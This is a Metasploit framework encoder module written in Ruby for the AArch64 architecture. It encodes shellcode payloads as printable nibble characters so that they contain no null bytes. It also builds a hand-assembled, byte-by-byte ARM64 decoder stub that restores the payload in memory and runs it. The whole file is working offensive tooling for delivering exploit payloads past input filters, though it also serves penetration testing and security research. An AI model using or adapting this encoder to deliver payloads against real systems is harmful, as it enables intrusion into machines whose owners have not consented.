##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Encoder
  Rank = NormalRanking

  def initialize
    super(
      'Name' => 'AArch64 null-byte encoder',
      'Description' => %q{
        This encoder produces an output that is guaranteed to be NULL-byte free.
        Max payload size is 4136 Bytes.
      },
      'Author' => 'A5t4t1ne',
      'Arch' => ARCH_AARCH64,
      'License' => MSF_LICENSE
    )
  end

  # Encodes payload
  def encode_block(state, buf)
    enc_pl = '_' * buf.length * 2 # encoding nibbles to chars -> length will be doubled

    for i in 0...buf.length do
      q = buf[i].ord
      enc_pl[2 * i] = mkchr((q >> 4) & 0xF) # c will always be between 0x41 ('A') and 0x50 ('P')
      enc_pl[2 * i + 1] = mkchr(q & 0xF)
    end

    return decode_stub(state, enc_pl)
  end

  def mkchr(ch)
    return (0x41 + ch).chr
  end

  # Generate the decode stub
  def decode_stub(_state, enc_buf)
    forward_jump, nops, backward_jump, while_condition = min_jmp_back(enc_buf)

    return 'jiL0' + #                   adr x10, 0x98D2D                - calc addr of encoded shellcode
           "JaB\xf1" + #                subs	x10, x10, #0x98, lsl #12
           "\x4a\x95\x34\xf1" + #       subs    x10, x10, #0xd25
           "\x4b\x01\x1f\xca" + #       eor x11, x10, xzr               - start of encoded shellcode becomes start of decoded instructions
           'sBSj' + #                   ands	w19, w19, w19, lsr #16  - clear w19
           'sBSj' + #                   ands	w19, w19, w19, lsr #16
           'b2Sj' + #                   ands	w2, w19, w19, lsr #12   - clear w2
           while_condition + # loop:    tbnz    w2, #<bit>, #0x40       - branch to code after n-iterations
           'RQA9' + #                   ldrb	w18, [x10, #84]         - load first byte
           'YUA9' + #                   ldrb	w25, [x10, #85]         - load second byte
           "Jm0\xb1" + #                adds	x10, x10, #0xc1b        - encoded_buf_index += 2
           "Je0\xf1" + #                subs	x10, x10, #0xc19
           "\x52\x02\x04\x11" + #       add w18, w18, #0x100            - sub 0x41 (upper nibble)
           "\x52\x06\x05\x51" + #       sub w18, w18, #0x141
           "\x39\x03\x04\x11" + #       add w25, w25, #0x100            - sub 0x41 (lower nibble)
           "\x39\x07\x05\x51" + #       sub w25, w25, #0x141
           "\x39\x13\x12\x2a" + #       orr w25, w25, w18, lsl #4       - assemble the nibbles to the original byte
           "\x79\x51\x01\x39" + #       strb	w25, [x11, #84]         - store original byte
           "ki0\xb1" + #                adds	x11, x11, #0xc1a        - x11++ decoded payload index
           "ke0\xf1" + #                subs	x11, x11, #0xc19
           'Bh01' + #                   adds	w2, w2, #0xc1a          - w2++ (loop counter)
           'Bd0q' + #                   subs	w2, w2, #0xc19
           forward_jump + #             tbz w19, #9, <offset>           - jump into nops
           enc_buf +
           nops +
           backward_jump #              tbz w19, #9, <to lbl 'loop'>    - end of decoding while-loop
  end

  def min_jmp_back(enc_buf)
    jump_back_offsets = [
      [540, 600, "\xf3\x10\x48\x36", "\x53\xed\x4f\x36", "\x02\x02\x48\x37"], # +540, -600, 512 iterations
      [1040, 1100, "\x93\x20\x48\x36", "\xb3\xdd\x4f\x36", "\x02\x02\x50\x37"], # +1040, -1100, 1024 iterations
      [2060, 2140, "\x73\x40\x48\x36", "\x33\xbd\x4f\x36", "\x02\x02\x58\x37"], # +2060, -2140, 2048 iterations
      [4140, 4276, "\x73\x81\x48\x36", 'szO6', "\x02\x02\x60\x37"], # +4140, -4276, 4096 iterations
    ]

    jump_back_offsets.each do |val|
      next if enc_buf.length >= val[0]

      bytes_to_fill = val[1] - enc_buf.length
      nops = (bytes_to_fill / 4) - 16 # loop lbl is 16 instructions above buffer

      return [val[2], "\x1f\x20\x03\xd5" * nops, val[3], val[4]]
    end

    raise ArgumentError, 'Encoding failed, payload too big.'
  end
end
